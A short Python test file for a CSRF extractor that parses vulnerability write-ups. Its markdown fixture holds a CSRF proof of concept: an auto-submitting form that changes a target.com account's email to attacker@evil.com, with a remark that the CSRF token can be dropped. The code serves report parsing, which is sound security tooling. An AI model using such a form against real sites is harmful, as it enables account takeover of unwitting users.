from src.extractors import EXTRACTORS
from src.extractors.csrf import extract

MD = """
PoC:

```html
<form action="https://target.com/account/email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

The `csrf_token` parameter can be removed entirely.
"""


def payloads():
    return [c.payload for c in extract(1, MD)]


def test_finds_auto_submitting_form():
    assert any("<form" in p for p in payloads())


def test_finds_token_parameter_reference():
    assert any("csrf_token" in p for p in payloads())


def test_registered():
    assert EXTRACTORS["csrf"] is extract
